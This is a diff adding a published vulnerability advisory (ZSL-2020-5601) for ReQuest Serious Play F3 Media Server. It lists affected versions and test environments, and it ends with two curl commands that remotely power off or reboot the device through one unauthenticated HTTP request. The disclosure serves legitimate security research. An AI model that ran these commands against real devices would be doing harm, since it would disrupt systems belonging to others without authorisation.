@@ -1,0 +1,50 @@
+# Exploit Title: ReQuest Serious Play F3 Media Server 7.0.3 - Remote Denial of Service
+# Exploit Author: LiquidWorm
+# Software Link: http://request.com/
+# Version: 3.0.0
+
+
+
+Vendor: ReQuest Serious Play LLC
+Product web page: http://www.request.com
+Affected version: 7.0.3.4968 (Pro)
+                  7.0.2.4954
+                  6.5.2.4954
+                  6.4.2.4681
+                  6.3.2.4203
+                  2.0.1.823
+
+Summary: F3 packs all the power of ReQuest's multi-zone serious Play servers
+into a compact powerhouse. With the ability to add unlimited NAS devices, the
+F3 can handle your entire family's media collection with ease.
+
+Desc: The device can be shutdown or rebooted by an unauthenticated attacker
+when issuing one HTTP GET request.
+
+Tested on: ReQuest Serious Play® OS v7.0.1
+           ReQuest Serious Play® OS v6.0.0
+           Debian GNU/Linux 5.0
+           Linux 3.2.0-4-686-pae
+           Linux 2.6.36-request+lenny.5
+           Apache/2.2.22
+           Apache/2.2.9
+           PHP/5.4.45
+           PHP/5.2.6-1
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+Macedonian Information Security Research and Development Laboratory
+Zero Science Lab - https://www.zeroscience.mk - @zeroscience
+
+
+Advisory ID: ZSL-2020-5601
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5601.php
+
+
+01.08.2020
+
+--
+
+
+$ curl http://192.168.1.17:3664/remote/index.php?cmd=poweroff
+$ curl http://192.168.1.17:3664/remote/index.php?cmd=reboot
